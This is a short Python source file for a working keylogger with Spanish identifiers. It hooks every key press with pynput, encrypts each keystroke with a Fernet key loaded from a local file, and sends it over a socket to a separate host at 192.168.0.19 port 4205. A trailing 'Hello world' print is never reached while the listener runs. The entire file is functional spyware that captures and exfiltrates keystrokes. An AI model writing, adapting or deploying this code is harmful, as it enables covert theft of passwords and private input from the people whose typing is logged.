import datetime
import socket
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet

def cargarclave():
	return open("clave.key","rb").read()

def key_recorder(key):
	clave = cargarclave()
	mi_socket = socket.socket()
	mi_socket.connect(('192.168.0.19',4205))
	mensaje = str(key).encode()
	f = Fernet(clave)
	print(clave)
	mensajeencriptado = f.encrypt(mensaje)
	mi_socket.send((mensajeencriptado))
	mi_socket.close()
	print(key)

with Listener(on_press=key_recorder) as l:
	l.join()

print("Hello world")


